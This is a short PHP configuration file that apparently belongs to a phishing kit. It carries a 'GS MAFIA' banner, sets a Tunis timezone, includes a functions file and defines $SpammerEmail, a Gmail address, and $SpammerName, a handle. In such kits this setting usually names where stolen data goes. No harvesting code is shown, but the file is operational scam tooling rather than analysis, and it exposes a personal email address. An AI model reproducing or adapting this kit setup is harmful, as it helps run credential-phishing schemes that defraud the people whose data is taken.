<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
date_default_timezone_set("Africa/Tunis");
include('includes/functions.php');
$SpammerEmail = "waldzou1@gmail.com";
$SpammerName = "weldzou";
?>